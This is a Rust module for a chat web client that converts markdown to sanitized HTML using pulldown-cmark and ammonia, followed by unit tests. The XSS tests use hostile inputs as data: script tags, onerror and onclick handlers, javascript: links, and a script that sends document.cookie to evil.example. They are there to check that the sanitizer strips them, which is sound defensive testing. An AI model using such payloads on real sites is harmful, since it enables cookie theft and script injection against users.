//! Chat markdown → **sanitized** HTML (issue #48).
//!
//! Assistant (and user) message content arrives as markdown and, until now,
//! rendered as escaped plain text (`app.rs`: `<p>{content}</p>`). This module
//! turns it into formatted HTML the chat view sets via `inner_html`.
//!
//! Assistant output is **untrusted** — a hostile turn can contain
//! `<script>`, `<img onerror=…>`, or a `javascript:` link — so the parser's HTML
//! is passed through [`ammonia`] (an `html5ever`-backed sanitizer) before it
//! ever reaches the DOM. Two reasons to sanitize *after* `pulldown_cmark` rather
//! than strip raw-HTML events during parsing (the same rationale as the GTK
//! client's `src/markdown.rs`, which shares these crate versions):
//!
//! 1. `pulldown_cmark`'s HTML renderer emits embedded raw HTML verbatim, and it
//!    coalesces a run like `<script>x</script>hello` into a single HTML block —
//!    dropping `Event::Html` would lose the adjacent legitimate text. `ammonia`
//!    parses the rendered HTML and removes only the dangerous constructs while
//!    preserving text.
//! 2. `ammonia` **re-serializes** through `html5ever`, so its output is always
//!    well-formed HTML — even from a mid-stream partial like an unterminated
//!    code fence. That is what lets the streaming path set `inner_html` on every
//!    delta without a malformed fragment ever breaking the page.
//!
//! The conversion is a pure function so it is host-tested here under `cargo
//! test` like [`crate::wire`] / [`crate::model`]; the `#[cfg(target_arch =
//! "wasm32")]` [`view`] helpers own the Leptos glue that sets the sanitized
//! HTML.

use std::sync::LazyLock;

use ammonia::Builder;
use pulldown_cmark::{Options, Parser, html};

/// The sanitizer, built once. Extends `ammonia`'s safe default (which already
/// strips `<script>`, event handlers, `<iframe>`, and unsafe URL schemes, and
/// rewrites link `rel` to `noopener noreferrer`) with `target="_blank"` forced
/// onto every anchor: on a phone, a chat link must open a new tab rather than
/// navigate the SPA away and drop the session. `rel` + `target` together are the
/// safe external-link pattern (no reverse-tabnabbing).
static SANITIZER: LazyLock<Builder<'static>> = LazyLock::new(|| {
    let mut b = Builder::default();
    b.set_tag_attribute_value("a", "target", "_blank");
    b
});

/// Convert markdown `input` to sanitized HTML safe to inject via `inner_html`.
///
/// Parse GFM-flavoured markdown, render it to HTML, then sanitize. See the
/// module docs for why sanitizing the rendered HTML (rather than filtering raw-
/// HTML events mid-parse) is the correct order, and why the sanitized output is
/// always well-formed even for a partial mid-stream buffer.
pub fn markdown_to_html(input: &str) -> String {
    let mut options = Options::empty();
    options.insert(Options::ENABLE_TABLES);
    options.insert(Options::ENABLE_STRIKETHROUGH);
    options.insert(Options::ENABLE_TASKLISTS);

    let parser = Parser::new_ext(input, options);
    let mut raw = String::new();
    html::push_html(&mut raw, parser);

    SANITIZER.clean(&raw).to_string()
}

#[cfg(target_arch = "wasm32")]
pub use view::{message_body, streaming_body};

#[cfg(target_arch = "wasm32")]
mod view {
    use leptos::prelude::*;

    use super::markdown_to_html;

    /// Render a *settled* message's markdown as sanitized HTML in a `.msg-body`
    /// container. Computed once at build time — a finished message's content
    /// doesn't change, so this needs no reactivity. The sanitized string is
    /// injected via `inner_html`; it can never carry executable HTML (see
    /// [`markdown_to_html`]).
    ///
    /// The returned view owns its sanitized `String` and borrows nothing from
    /// `content` — `use<>` makes that explicit so the opaque type doesn't (under
    /// Rust 2024's capture rules) tie itself to the caller's `&str` lifetime.
    pub fn message_body(content: &str) -> impl IntoView + use<> {
        view! { <div class="msg-body" inner_html=markdown_to_html(content)></div> }
    }

    /// Render the live streaming buffer reactively: each delta re-parses and
    /// re-sanitizes the partial markdown, so formatting settles as text arrives
    /// and the final render matches `message_body` once the reply completes. An
    /// unterminated code fence mid-stream still yields well-formed HTML (ammonia
    /// re-serializes), so a partial buffer can't break the page.
    pub fn streaming_body(streaming: RwSignal<String>) -> impl IntoView {
        view! {
            <div
                class="msg-body"
                inner_html=move || markdown_to_html(&streaming.get())
            ></div>
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // --- Formatting coverage (headings/bold/italic/lists/links/code/quotes) ---

    #[test]
    fn bold_and_italic_render() {
        let html = markdown_to_html("**bold** and *italic*");
        assert!(html.contains("<strong>bold</strong>"), "bold: {html:?}");
        assert!(html.contains("<em>italic</em>"), "italic: {html:?}");
    }

    #[test]
    fn headings_render() {
        let html = markdown_to_html("# Title");
        assert!(html.contains("<h1>Title</h1>"), "h1: {html:?}");
    }

    #[test]
    fn inline_code_renders() {
        let html = markdown_to_html("use `cargo test` now");
        assert!(html.contains("<code>cargo test</code>"), "inline: {html:?}");
    }

    #[test]
    fn fenced_code_block_renders_in_pre() {
        let html = markdown_to_html("```rust\nfn main() {}\n```");
        assert!(html.contains("<pre>"), "code block in <pre>: {html:?}");
        assert!(html.contains("<code"), "code element present: {html:?}");
        assert!(html.contains("fn main()"), "code text preserved: {html:?}");
    }

    #[test]
    fn unordered_list_renders() {
        let html = markdown_to_html("- one\n- two");
        assert!(html.contains("<ul>"), "ul: {html:?}");
        assert!(html.contains("<li>one</li>"), "li: {html:?}");
        assert!(html.contains("<li>two</li>"), "li: {html:?}");
    }

    #[test]
    fn ordered_list_renders() {
        let html = markdown_to_html("1. first\n2. second");
        assert!(html.contains("<ol>"), "ol: {html:?}");
        assert!(html.contains("<li>first</li>"), "li: {html:?}");
    }

    #[test]
    fn blockquote_renders() {
        let html = markdown_to_html("> quoted wisdom");
        assert!(html.contains("<blockquote>"), "blockquote: {html:?}");
        assert!(html.contains("quoted wisdom"), "quote text: {html:?}");
    }

    #[test]
    fn table_renders() {
        // ENABLE_TABLES (GFM) — pipe tables become <table>.
        let md = "| a | b |\n| - | - |\n| 1 | 2 |";
        let html = markdown_to_html(md);
        assert!(html.contains("<table>"), "table: {html:?}");
        assert!(html.contains("<td>1</td>"), "cell: {html:?}");
    }

    #[test]
    fn strikethrough_renders() {
        // ENABLE_STRIKETHROUGH (GFM) — `~~x~~` becomes <del>.
        let html = markdown_to_html("~~gone~~");
        assert!(html.contains("<del>gone</del>"), "strikethrough: {html:?}");
    }

    #[test]
    fn markdown_link_gets_href_safe_rel_and_blank_target() {
        // The link renders with the href, opens in a new tab (mobile: never
        // navigate the SPA away), and carries the safe rel to defuse
        // reverse-tabnabbing.
        let html = markdown_to_html("see [the docs](https://example.com/x)");
        assert!(
            html.contains(r#"href="https://example.com/x""#),
            "href: {html:?}"
        );
        assert!(html.contains(">the docs</a>"), "link text: {html:?}");
        assert!(
            html.contains(r#"target="_blank""#),
            "target=_blank: {html:?}"
        );
        assert!(html.contains("noopener"), "rel noopener: {html:?}");
        assert!(html.contains("noreferrer"), "rel noreferrer: {html:?}");
    }

    // --- Sanitizer / XSS (CRITICAL): assistant output is untrusted ------------

    #[test]
    fn raw_script_tag_is_stripped_but_text_survives() {
        // A run pulldown-cmark treats as one HTML block; ammonia must strip the
        // <script> while keeping the adjacent legitimate text.
        let html = markdown_to_html("<script>alert(1)</script>hello");
        assert!(
            html.contains("hello"),
            "text after script survives: {html:?}"
        );
        assert!(
            !html.to_ascii_lowercase().contains("<script"),
            "<script> stripped: {html:?}"
        );
        assert!(!html.contains("alert(1)"), "script body gone: {html:?}");
    }

    #[test]
    fn img_onerror_handler_is_stripped() {
        let html = markdown_to_html("before <img src=x onerror=\"alert(1)\"> after");
        assert!(html.contains("before"), "leading text: {html:?}");
        assert!(html.contains("after"), "trailing text: {html:?}");
        assert!(
            !html.to_ascii_lowercase().contains("onerror"),
            "onerror handler gone: {html:?}"
        );
        assert!(!html.contains("alert(1)"), "handler body gone: {html:?}");
    }

    #[test]
    fn javascript_uri_is_stripped_from_markdown_link() {
        let html = markdown_to_html("click [me](javascript:alert(1)) now");
        assert!(
            !html.to_ascii_lowercase().contains("javascript:"),
            "javascript: scheme stripped from md link: {html:?}"
        );
        assert!(html.contains("click"), "surrounding text: {html:?}");
        assert!(html.contains("me"), "link text survives: {html:?}");
    }

    #[test]
    fn javascript_uri_is_stripped_from_raw_anchor() {
        let html = markdown_to_html("<a href=\"javascript:alert(1)\">x</a>");
        assert!(
            !html.to_ascii_lowercase().contains("javascript:"),
            "javascript: scheme stripped from raw anchor: {html:?}"
        );
    }

    #[test]
    fn iframe_and_event_handlers_are_stripped() {
        let html = markdown_to_html(
            "<iframe src=\"javascript:alert(1)\"></iframe>\n\n\
             <a href=\"https://ok.example\" onclick=\"alert(2)\">link</a>",
        );
        let lower = html.to_ascii_lowercase();
        for bad in ["<iframe", "onclick", "javascript:", "alert("] {
            assert!(
                !lower.contains(bad),
                "hostile token {bad:?} present: {html:?}"
            );
        }
        // The legitimate link survives (inert), href intact.
        assert!(html.contains("link"), "link text survives: {html:?}");
        assert!(
            html.contains(r#"href="https://ok.example""#),
            "safe href: {html:?}"
        );
    }

    #[test]
    fn hostile_assistant_turn_yields_no_executable_html() {
        // End-to-end-ish: everything an attacker might pack into one turn.
        let hostile = "Sure, here is a tip:\n\n\
             <script>fetch('https://evil.example/'+document.cookie)</script>\n\n\
             <img src=x onerror=\"alert('pwn')\">\n\n\
             [totally safe](javascript:alert(1))\n\n\
             Bye!";
        let html = markdown_to_html(hostile);
        assert!(html.contains("Sure, here is a tip"), "leading text: {html}");
        assert!(html.contains("Bye!"), "trailing text: {html}");
        let lower = html.to_ascii_lowercase();
        for bad in [
            "<script",
            "onerror",
            "onclick",
            "onload",
            "javascript:",
            "<iframe",
            "alert(",
        ] {
            assert!(
                !lower.contains(bad),
                "hostile token {bad:?} present: {html}"
            );
        }
    }

    // --- Streaming robustness: a partial buffer must never break the page -----

    #[test]
    fn unterminated_code_fence_is_wellformed() {
        // Mid-stream the closing ``` has not arrived yet. pulldown-cmark treats
        // the rest as a code block; ammonia re-serializes to balanced HTML, so
        // the fragment set via inner_html can't break the DOM.
        let html = markdown_to_html("intro\n\n```rust\nfn main() {\n    let x = 1;");
        assert!(html.contains("<pre>"), "opens a <pre>: {html:?}");
        assert!(html.contains("</code></pre>"), "closes balanced: {html:?}");
        assert!(
            html.contains("let x = 1;"),
            "partial code retained: {html:?}"
        );
    }

    #[test]
    fn unterminated_bold_marker_does_not_panic() {
        // A half-typed `**bold` (no closing) must convert without panicking and
        // still surface the text.
        let html = markdown_to_html("this is **bold but unclosed");
        assert!(
            html.contains("bold but unclosed"),
            "text retained: {html:?}"
        );
    }

    #[test]
    fn empty_input_is_empty_output() {
        assert_eq!(markdown_to_html(""), "");
    }

    #[test]
    fn plain_text_is_paragraph_wrapped_and_escaped() {
        // No markdown syntax, but angle brackets in prose must be escaped, never
        // interpreted as tags.
        let html = markdown_to_html("a < b and c > d");
        assert!(html.contains("<p>"), "wrapped in <p>: {html:?}");
        assert!(html.contains("&lt;"), "< escaped: {html:?}");
        assert!(html.contains("&gt;"), "> escaped: {html:?}");
    }
}
